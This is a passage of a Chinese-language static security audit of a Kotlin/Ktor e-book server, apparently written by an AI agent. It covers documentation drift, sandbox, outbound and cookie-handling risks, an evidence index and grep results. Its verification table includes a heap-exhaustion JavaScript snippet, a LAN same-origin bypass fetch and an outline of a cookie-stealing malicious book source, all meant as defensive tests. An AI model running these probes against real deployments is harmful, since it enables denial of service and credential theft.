| # | 文档声称 | 代码事实 | 证据 |
|---|----------|----------|------|
| **1** | 「单个 JVM 进程 · **Ktor CIO 3.4.3**」，全文 4 处提 CIO | 引擎是 **Netty**（2026-11-17 从 CIO 换掉，原因是 CIO 的阻塞写在停读客户端下钉死线程） | `docs/ARCHITECTURE.md:20,192,284,325`（CIO 4 次，Netty 0 次）vs `Application.kt:76-86`（`embeddedServer(Netty, …)`）、`Application.kt:49-54`（换引擎的说明） |
| **2** | 路由装配含 `agentApiRoutes` | `/api/agent` 一组**不再注册**（AI 已移出编译） | `docs/ARCHITECTURE.md:377` vs `Application.kt:176-177`、`http/Routes.kt`（无 agent 装配） |
| **3** | 同一份文档内两处端点数不一致：`165 端点 / 19 组` 与 `144 条 / 18 组` | 真源 `agent-api.json` 的 `count = 144`；且该目录描述的是**已下线**的端点集 | `docs/ARCHITECTURE.md:286` vs `:409`；`product/app/src/main/resources/agent-api.json`（`"count": 144`） |
| **4** | `ai/Agent.kt` 是网关实现，路径 `io.legado.ai.Agent` | 已迁到 `product/experimental/ai/`，不参与编译 | `docs/ARCHITECTURE.md:558` vs AGENTS.md §8.2、`Application.kt:176-177` |
| **5** | **Cookie 按完整主机存、读取时逐级回退到父域**（"比上游更严格：`hm.baidu.com` 的 Cookie 不会发给别的 baidu 子域"） | 实际桶键 = **注册域 eTLD+1**，没有逐级回退 → `hm.baidu.com` 的 Cookie **会**发给 `www.baidu.com` 及其它 baidu 子域 | `source/WebViewProxy.kt:464-470`（文档串）vs `data/CookieDao.kt:27-33`（`cookieBucket` = `registrableDomain`）+ `source/WebViewProxy.kt:422-430` |
| **6** | 同源闸门"从前是 **84 处**手抄的 `requireSameOriginWrite()`"；同文件另一处"仍手调的 **88 处**是纵深防御"；再一处"手调的 **89 处**" | 三个数字互不相同（同一文件内） | `http/Guard.kt:63`（84）、`http/Guard.kt:70`（88）、`http/Guard.kt:103`（89） |
| **7** | Docker 描述为"部署方可选的外部绑定" | Dockerfile **默认**写死 `LEGADO_HOST=0.0.0.0` + `LEGADO_ALLOW_EXTERNAL_BIND=1`，不是可选而是默认 | `AppConfig.kt:211-220`（"显式开关"语气）vs `product/Dockerfile:50` |
| **8** | `ServerConfig.aiEnabled`「关着时不注册 `/api/agent` 那一组」 | 无论开关如何都不注册（代码已移出），且默认 `true` → `/healthz` 回 `ai: true` | `ServerConfig.kt:27-30` vs `Application.kt:287` |

**模式归纳**：漂移全部集中在**"大重构之后没回写文档"**（引擎更换、AI 外迁）与**"注释写的是意图、代码后来改了实现"**（#5、#6）。重建时的对策：把这几处的**数字与路径**从文档里拿掉，改成指向真源（枚举/常量/自动生成），只保留"为什么"。

---

## 6. 结论：哪些风险可以接受、哪些重建时必须解决

### 6.1 可以接受（属于产品定位，不该在重建里"修"）

| 风险 | 为什么可接受 | 但有前提 |
|------|--------------|----------|
| **零鉴权**（无账号/无 token/无会话） | 用户明确的产品决策（`http/Guard.kt:15-17` 记录了原话"咱们这个是开源的，不要那么多条条框框"）；单机单人软件，加登录只会被绕过（用户会把密码写在便签上） | **前提是"只绑回环"**。一旦破这条前提（Dockerfile），零鉴权立刻从"合理"变成"P0" |
| **无 Origin 的请求放行** | 本机其它进程本来就能读 SQLite 文件，闸门只是挡浏览器 | 前提同上 |
| **Cookie 明文落库 + 按域全局共享** | 单人单机，跨源共享是"登录一次处处可用"的体验基础 | 前提是"只导入信任书源"。重建应把这条前提**写进 UI**（导入时的显式确认） |
| **备份 AES/ECB + MD5 派生** | 上游兼容口径，不改才能读手机备份 | 文档必须说明"这不是我们的安全设计" |
| **eTLD+1 归桶** | 与上游一致，误伤最小 | 需修文档（§5 #5） |

### 6.2 重建时必须设计进去（5 条安全边界）

> 这 5 条是本次审计的核心产出。每条都对应"现有实现已经成立、但依赖脆弱前提"的地方 —— 重建时若丢掉前提，防护会**静默**失效。

**B1. 出站唯一入口 = 受控工厂 + 钉 IP 代理（不可绕过）**
新代码必须**拿不到**裸 `HttpClient`。做法照抄 `ops/NetworkSecurity.kt:54-69` + `ops/GuardedHttpClient.kt:28-88` + `ops/PinnedProxy.kt:203-212`：工厂返回包装实例，`send/sendAsync` 全重载过闸，代理解析一次并连同一 `InetAddress`。
**判据**：一条 ArchUnit 风格测试 —— `io.legado.**` 里除 `ops/` 外**禁止**出现 `HttpClient.newBuilder`/`newHttpClient`（现有 3 处违规 S3/S4 正是没有这条规则才活下来的）。

**B2. 脚本沙箱 = 白名单 + ClassShutter + 三档预算（预算须覆盖出站与堆）**
照抄 `rules/JavaPackages.kt:1385-1403`（显式 45 类白名单 + `else -> error`）+ `JsSandbox.kt:303`（ClassShutter false）+ `JsGuard.kt`（墙钟/栈深/宿主字节）。
**必须补的两档**：**出站次数预算**（S5）与**纯 JS 堆预算**（S13）。
**判据**：沙箱不变量回归（ClassShutter 生效 / 沙箱内不存在 `NativeJavaObject` / 预算超限必抛），且**每次 Rhino 升级都必须跑绿**。

**B3. 本地服务 = 默认回环 + 外部绑定必须过鉴权（不能只有警告）**
现状是「外部绑定 = 打一条警告然后放行」（`Application.kt:144-153`）。重建应改成「外部绑定 ⇒ 自动生成一次性 token 并强制校验」，或「外部绑定 ⇒ 默认只读」。
**判据**：一条测试断言「`host != loopback` 且无 token ⇒ 所有写端点 401」。

**B4. 页面内容 = 不可信源 + 响应级 CSP sandbox**
现状靠 iframe `sandbox` 属性（前端可控、可被用户绕过）。重建应让**服务端**给代理 HTML 加 `Content-Security-Policy: sandbox allow-scripts allow-forms`，使"顶层打开也仍是不透明源"。
**判据**：`WebViewProxyTest` 加一条「代理响应必须带 CSP sandbox 头」（现状测试断言的是**剥离**目标站 CSP，`WebViewProxyTest.kt:74` —— 要区分"剥离目标站的"与"我们自己加的"）。

**B5. 导入面 = 容器判别 + 真实字节上限 + 单事务 + 不落盘**
照抄 `backup/BackupImporter.kt:99`（魔数判容器）、`:415-421`（真实字节封顶，不信声明 size）、`:50`（绝不落盘 ⇒ 无 zip-slip）、`:253`（整批单事务）+ `localbook/LocalBookParser.kt:244-252`。**并把「请求体上限」从导入侧推广到所有原始文本端点**（S9 的教训：纪律只在两个地方落地，第三处就漏）。

### 6.3 重建的迁移顺序建议（依赖关系）

```
1. 先立判据（B1/B2/B3/B4/B5 各一条会红的测试）
2. 再修 P1 的 4 个缺口（S3 S4 S5 + D1-4/5/6/7）
3. 才能动巨型文件（D0-2/D0-3：JsSandbox/RuleRunner）
4. 最后才动事务模型（D1-8：ShelfDao/CacheDao）
```
理由：`JsSandbox`/`RuleRunner` 的改动**没有判据就等于赌博**；事务模型的改动会触及所有 DAO，必须排在最后。

---

## 7. 证据索引表

| ID | 结论 | 文件:行 | 类型 |
|----|------|---------|------|
| E01 | 沙箱禁全部 Java 反射 | `rules/JsSandbox.kt:303` | 事实 |
| E02 | 沙箱用 `initSafeStandardObjects` | `rules/JsSandbox.kt:304` | 事实 |
| E03 | 45 类显式白名单 | `rules/JavaPackages.kt:1385-1403` | 事实 |
| E04 | 白名单外一律 `error()` | `rules/JavaPackages.kt:644` | 事实 |
| E05 | 不放真实 Java 对象（不变量） | `rules/JavaPackages.kt:1166-1180` | 事实 |
| E06 | 墙钟守卫 | `rules/JsGuard.kt:44-48,63-64` | 事实 |
| E07 | 栈深 1000 | `rules/JsGuard.kt:76,91` | 事实 |
| E08 | 宿主字节预算 | `rules/JsGuard.kt:132-144`、`AppConfig.kt:162,176-179` | 事实 |
| E09 | Thread.sleep 封顶 1s | `rules/JavaPackages.kt:240-258,1409` | 事实 |
| E10 | `System.getenv` 已移除 | `rules/JavaPackages.kt:261-276` | 事实 |
| E11 | `Reload()` 拉远端 JS | `rules/JsSandbox.kt:341-354` | 事实 |
| E12 | JS cookie 域限是文本判定（可绕） | `rules/JsSandbox.kt:367-376,972-995` | 事实 |
| E13 | 出站唯一受控工厂 | `ops/NetworkSecurity.kt:54-69` | 事实 |
| E14 | 每 send 过闸 | `ops/GuardedHttpClient.kt:40-88` | 事实 |
| E15 | PinnedProxy 钉 IP | `ops/PinnedProxy.kt:203-212` | 事实 |
| E16 | scheme 仅 http(s) | `ops/NetworkSecurity.kt:93` | 事实 |
| E17 | 特殊段判定（CGNAT/ULA/元数据…） | `ops/NetworkSecurity.kt:114-166` | 事实 |
| E18 | 重定向逐跳重校验（媒体） | `http/MediaRoutes.kt:470,481` | 事实 |
| E19 | 重定向逐跳重校验（内置浏览器） | `source/WebViewProxy.kt:276-282,370` | 事实 |
| E20 | **WebViewProxy 用裸 client（S3）** | `source/WebViewProxy.kt:60-63` | 事实 |
| E21 | **TTS 只校验 scheme（S4）** | `tts/EdgeTtsService.kt:341-345,361-375` | 事实 |
| E22 | 未被闸门覆盖的出站点清单 | `ops/UpdateCheck.kt:42`、`source/ExternalBrowserLogin.kt:99`、`DesktopLauncher.kt:313,323` | 事实 |
| E23 | Cookie 桶 = eTLD+1 | `data/CookieDao.kt:27-33` | 事实 |
| E24 | 注册域近似 + 多段后缀表 | `source/WebViewProxy.kt:396-404,422-430` | 事实 |
| E25 | 请求时按落地域取 Cookie | `rules/RuleRunner.kt:1392-1394`、`ops/ProxyHeaders.kt:24-36` | 事实 |
| E26 | Cookie 跨书源共享 | `data/CookieDao.kt:94`、`http/SourcesRoutes.kt:539-540` | 事实 |
| E27 | 会话 Cookie 不落盘 | `data/SessionCookies.kt:14-25` | 事实 |
| E28 | 无 Cookie/Token 日志（grep 负结果） | 全仓 `grep`（见 §0.1） | 事实 |
| E29 | LogService 无脱敏 | `ops/LogService.kt`（`redact\|mask\|脱敏` 零命中） | 事实 |
| E30 | 默认回环 + 8080 | `ServerConfig.kt:48,51` | 事实 |
| E31 | 非回环必须显式放行否则拒绝启动 | `http/Guard.kt:148-156`、`Application.kt:138` | 事实 |
| E32 | **Docker 默认外部绑定（S1）** | `product/Dockerfile:50` | 事实 |
| E33 | 同源写闸门（全局插件） | `http/Guard.kt:72-96`、`Application.kt:273` | 事实 |
| E34 | 无 Origin 即放行 | `http/Guard.kt:79-80,108` | 事实 |
| E35 | 只读 POST 白名单（含 3 条死路径） | `http/Guard.kt:39-44` | 事实 |
| E36 | 自管来源策略的路由放行 | `http/Guard.kt:57-58`、`http/SourcesRoutes.kt:772-784` | 事实 |
| E37 | **`0.0.0.0` 下任意私网字面量算同源（S6）** | `http/Guard.kt:177,184-190` | 推断 |
| E38 | 无全局 CORS | `Application.kt:221-243` | 事实 |
| E39 | 代理响应 ACAO `*` | `http/SourcesRoutes.kt:796` | 事实 |
| E40 | 静态只服务 classpath `/`，`/next` 服务磁盘 | `StaticWeb.kt:262,277-290` | 事实 |
| E41 | 品牌图标拒 SVG（按魔数） | `StaticWeb.kt:225-233` | 事实 |
| E42 | 前端零 `dangerouslySetInnerHTML` | `web/src/main.tsx:81`、`SkinModal.tsx:35`、`SourceLoginUiPanel.tsx:61`（皆注释） | 事实 |
| E43 | 代理 HTML 剥离目标 CSP | `WebViewProxyTest.kt:74`、`source/WebViewProxy.kt:664-690` | 事实 |
| E44 | iframe sandbox 无 allow-same-origin | `SourceLoginUiPanel.tsx:560`、`MediaBlock.tsx:47` | 事实 |
| E45 | **postMessage 无 origin/source 校验（S7）** | `SourceLoginUiPanel.tsx:370-388` | 事实 |
| E46 | 错误页已转义 | `http/SourcesRoutes.kt:817-820` | 事实 |
| E47 | 同源 SVG 拒绝 | `http/MediaRoutes.kt:96-97,415` | 事实 |
| E48 | 图片 URL 仅 http(s)/绝对路径 | `web/src/lib/sourceImport.ts:40-48` | 事实 |
| E49 | 备份：ZipFile 不落盘（无 zip-slip） | `backup/BackupImporter.kt:50,103,146` | 事实 |
| E50 | 备份：真实字节封顶（抗谎报） | `backup/BackupImporter.kt:415-421,516-518` | 事实 |
| E51 | 备份：单事务六域回滚 | `backup/BackupImporter.kt:253`、`BackupImportAtomicTest.kt` | 事实 |
| E52 | 备份：魔数判容器 | `backup/BackupImporter.kt:99` | 事实 |
| E53 | 备份加密口径（上游兼容） | `backup/BackupImporter.kt:55-77` | 事实 |
| E54 | 导出不含 Cookie | `backup/BackupExporter.kt:40,52`（`cookie` 零命中） | 事实 |
| E55 | EPUB 解压三重上限 | `localbook/LocalBookParser.kt:38-42,244-252,414-425` | 事实 |
| E56 | EPUB 内路径 `..` 根钳制 | `localbook/LocalBookParser.kt:550-560` | 事实 |
| E57 | 本地书取图五重边界 | `http/MediaRoutes.kt:99-125` | 事实 |
| E58 | **请求体无上限（S9）** | `http/StrictRequestText.kt:25`（调用点 `ReplaceRulesRoutes.kt:106`、`SourcesRoutes.kt:577`） | 事实 |
| E59 | 严格 JSON 编码 | `Application.kt:226-227`、`http/StrictJsonConverter.kt` | 事实 |
| E60 | GzipLimits 有界解压 | `rules/GzipLimits.kt:45-60` | 事实 |
| E61 | **两处无界 gzip（S12）** | `source/WebViewProxy.kt:504-510`、`http/MediaRoutes.kt:392-398` | 事实 |
| E62 | 默认堆 1g | `product/start.mjs:354` | 事实 |
| E63 | 依赖清单 | `product/app/build.gradle:318-338`、`product/web/package.json:27-40` | 事实 |
| E64 | 418 处 `runCatching` | 全仓 grep（Top：`JsSandbox` 49） | 事实 |
| E65 | TODO/FIXME/HACK = 0 | 全仓 grep（Kotlin 与前端均 0） | 事实 |
| E66 | 事务模型双轨（D1-8） | `data/Database.kt:134-137`、`data/ShelfDao.kt:25,36,186,230,235,250,255`、`data/CacheDao.kt:83,204` | 事实 |
| E67 | 两个 `fun main` | `Application.kt:114`、`DesktopLauncher.kt` | 事实 |
| E68 | 启动器体量 | `product/start.mjs`（413 行 / 22832 字节）、`stop.mjs`（4820 字节） | 事实 |
| E69 | 文档漂移 #1（CIO vs Netty） | `docs/ARCHITECTURE.md:20,192,284,325` vs `Application.kt:76-86` | 事实 |
| E70 | 文档漂移 #2/#3（agent 路由与端点数） | `docs/ARCHITECTURE.md:286,377,409` vs `Application.kt:176-177`、`agent-api.json`（144） | 事实 |
| E71 | 文档漂移 #5（Cookie 按主机 vs eTLD+1） | `source/WebViewProxy.kt:464-470` vs `data/CookieDao.kt:27-33` | 事实 |
| E72 | 文档漂移 #6（84/88/89 三数字） | `http/Guard.kt:63,70,103` | 事实 |
| E73 | 巨型文件行数 | `JsSandbox` 2100 / `RuleRunner` 1758 / `JavaPackages` 1415 / `SourcesRoutes` 830 / `WebViewProxy` 817 / `CookieDao` 716 / `ReaderScreen.tsx` 2403 / `ShelfPage.tsx` 943 | 事实 |

---

## 8. 未确认事项（含验证方法）

| # | 事项 | 为何未确认 | 验证方法 |
|---|------|-----------|----------|
| U1 | **纯 JS 堆分配能否绕过 64MB 宿主预算并 OOM**（S13） | 需要实跑脚本，纪律禁止 | 起一个 `-Xmx256m` 的实例，用**测试代码**（不是书源）调 `JsSandbox.evaluate`，脚本 `var a=[];for(;;)a.push('x'.repeat(1<<20))`，观察是抛 deadline 异常还是 OOM。若 OOM ⇒ 需给 Rhino 侧加堆预算或降低 `jsTimeoutMs` 默认值 |
| U2 | 恶意书源跨域读 Cookie 并外传的**完整链路**是否真的通（S2） | 需要构造恶意书源并实跑（禁止） | 静态已足够：`RuleRunner.kt:1392` 无条件按 URL 附 Cookie + 外呼无限制。若需实证：用**本地两台**（mock 站点 + mock 收集器）在隔离网络里构造无害 PoC，不触公网 |
| U3 | **各依赖的具体 CVE**（§2.8） | 无网络，未查 CVE 库 | `osv-scanner -r product/` + `gradle dependencyCheckAnalyze`；重点核对 `rhino:1.8.0`、`ktor:3.4.3`、`json-path:2.9.0` |
| U4 | **`0.0.0.0` 下同源闸门被局域网绕过**（S6） | 未实跑；结论来自代码路径推断 | 两台机器：A 跑服务（`LEGADO_HOST=0.0.0.0 LEGADO_ALLOW_EXTERNAL_BIND=1`），B 在**同端口**起一个页面 `fetch('http://A:8080/api/shelf/...', {method:'POST'})`，看是否 200 |
| U5 | 合法书源**单次执行的请求数分布**（影响 D1-3 的阈值） | 需要真库运行 | 在 `fetchResponse` 加临时计数器，跑内置 665+ 源各一次，取 p99 → 定阈值 |
| U6 | `MULTI_PART_TLDS` 未覆盖的私有后缀（`*.github.io` 等）是否造成跨站混桶 | 需要枚举真实书源域名 | 导出全部 `bookSourceUrl` 主机名，按 `registrableDomain` 归桶，检查是否有**不同站**落同桶 |
| U7 | `docs/ARCHITECTURE.md` 之外是否还有其它漂移（本次只抽查 8 处） | 文档 760 行，未逐句核对 | `npm --prefix product run docs:api-check` + 人工核对 §4 状态图；建议重建时把数字改为自动生成 |
| U8 | 前端 37k 行中是否存在间接 HTML 注入（如第三方组件的 `innerHTML`） | 只 grep 了本项目源码，未审计依赖内部 | 检查 `node_modules` 里 `@material/material-color-utilities`、`hls.js` 是否有 DOM 注入用法（本次禁读 `node_modules`） |
| U9 | `GzipLimits` 是否真的被所有解压点使用（S12 的两处漏网是否只有两处） | 按 `GZIPInputStream` grep 得 6 处，未逐一确认调用上限 | 逐点核对 §7 的 E60/E61；把"解压必须走 GzipLimits"做成 ArchUnit 规则 |
| U10 | `agent-api.json` 的 144 条与真实注册路由的差集 | 需要跑服务比对 | 起服务后抓 `/api/catalog`，与 `RouteCatalog` 输出求差 |

---

## 9. 覆盖率声明

### 9.1 实际覆盖（估）

| 范围 | 规模 | 覆盖方式 | 覆盖度 |
|------|------|----------|--------|
| `rules/`（沙箱/规则引擎） | 26 文件 / ~9.5k 行 | 定向 grep + 窗口读（`JsSandbox` 读约 15%、`JavaPackages` 约 8%、`JsGuard` 100%、`GzipLimits` 100%） | **~30%**（安全关键路径 ~85%；业务取值逻辑基本未读） |
| `ops/`（出站/网络） | 9 文件 | `GuardedHttpClient` 100%、`NetworkSecurity` 100%、`ProxyHeaders` 100%、`PinnedProxy` ~25%、其余按 grep 定位 | **~70%** |
| `http/` | 20 文件 | `Guard` 100%、`MediaRoutes` 关键段、`SourcesRoutes` 关键段、`SystemRoutes` 60%、其余仅 grep | **~25%** |
| `data/`（凭据/事务） | 20 文件 | `CookieDao` 关键段、`SessionCookies` 100%、`Database` 事务段、`ImportDao` 函数签名 | **~20%** |
| `backup/` | 4 文件 | `BackupImporter` ~50%（导入面 100%）、`BackupExporter` 仅条目常量 | **~45%** |
| `localbook/` | 2 文件 | `LocalBookParser` 安全段 100%（zip 上限/路径），解析逻辑未读 | **~35%** |
| `source/` | 5 文件 | `WebViewProxy` ~45%（令牌/校验/重定向/引导脚本）、`ExternalBrowserLogin` ~25% | **~40%** |
| `tts/` | 2 文件 | `EdgeTtsService` 仅出站段 | **~15%** |
| 根目录（`Application`/`ServerConfig`/`AppConfig`/`StaticWeb`/`DesktopLauncher`） | 8 文件 | `Application` 100%、`ServerConfig` 100%、`AppConfig` 100%、`StaticWeb` 100%、`DesktopLauncher` ~20% | **~70%** |
| 前端 `product/web/src` | 37k 行 | 只按 6 个 XSS 关键词全量 grep + 读了 3 个文件的关键段 | **~8%** |
| 测试清单 | 139 个后端测试文件 | 仅文件名 + 抽查 3 个 | 清单级 |
| **加权总覆盖（后端 main 29.5k 行）** | | | **约 32%**（其中**安全相关代码约 75%**） |

### 9.2 未覆盖 / 明显薄弱

1. `rules/RuleRunner.kt` 的业务主体（取值、分页、登录动作编排，~1400 行）—— 只按"是否有 SSRF/日志/事务问题"检索过，**未做功能审计**。
2. `rules/RuleValue.kt`（802 行，模板表达式）—— 完全未读，它对**不可信模板字符串**求值，是一个应单独审的攻击面。
3. `tts/TtsSessionService.kt`（417 行）—— 未读；它建会话、追加音频、改状态，且在写闸门的只读白名单讨论里被点名为"标 `write=false` 却会写"（`http/Guard.kt:35-37` 注释）。
4. 前端 37k 行的绝大部分。
5. `content/`、`reading/`、`cache/`、`subscription/`、`port/` 包 —— 仅按关键词命中阅读。
6. `product/experimental/ai/` —— 按设计跳过（不参与编译/打包）。

### 9.3 本审计**没有**做的事（明确声明）

- ❌ 未运行任何测试（`./gradlew :app:test` 未执行）—— 因此「测试存在」是文件级事实，「测试通过」不是本审计的结论。
- ❌ 未做动态渗透、未构造恶意书源、未发任何 HTTP 请求。
- ❌ 未查 CVE 数据库。
- ❌ 未审计构建产物的实际内容（`*.jar` 在禁读区）。

---

## 附录 A：关键 grep 原始结果（可复现）

```bash
# A. 出站 client 直用点（6 处业务点，仅 5 处走闸门）
grep -rn "HttpClient.newHttpClient\|HttpClient\.newBuilder\|newHttpClient(" --include=*.kt .
#  A. 结果：
#   DesktopLauncher.kt:313,323 | tts/EdgeTtsService.kt:28 | source/ExternalBrowserLogin.kt:99
#   source/WebViewProxy.kt:60 | ops/UpdateCheck.kt:42          ← 未走闸门/未钉 IP
#   subscription/SubscriptionService.kt:39 | rules/RuleRunner.kt:117
#   http/MediaRoutes.kt:448 | http/ReplaceRulesRoutes.kt:128 | cache/CoverCache.kt:41  ← 走闸门

# B. 静默失败规模
grep -rn "runCatching" --include=*.kt . | wc -l          # 418

# C. 债务标记
grep -rn "TODO\|FIXME\|HACK\|XXX" --include=*.kt app/src/main/kotlin | wc -l   # 0
grep -rn "TODO\|FIXME\|HACK" --include=*.ts --include=*.tsx web/src | wc -l     # 0

# D. 前端 HTML 注入面（命中全为注释）
grep -rn "dangerouslySetInnerHTML\|innerHTML\|insertAdjacentHTML\|outerHTML\|document.write" web/src

# E. 无界解压点
grep -rn "GZIPInputStream" --include=*.kt .   # 6 处，其中 2 处未用 GzipLimits

# F. 日志脱敏缺口
grep -n "redact\|mask\|脱敏" ops/LogService.kt   # 0

# G. 硬编码凭据
grep -rn "password\|secret\|apiKey\|-----BEGIN" --include=*.kt . | grep -v "// " # 全为局部变量/形参
```

---

*本文档为静态审计产物，所有结论可回溯到 `文件:行号`。凡未能在代码中确认者已标注【未确认，需人工验证】并给出验证方法。本文档不改动归档内任何文件。*
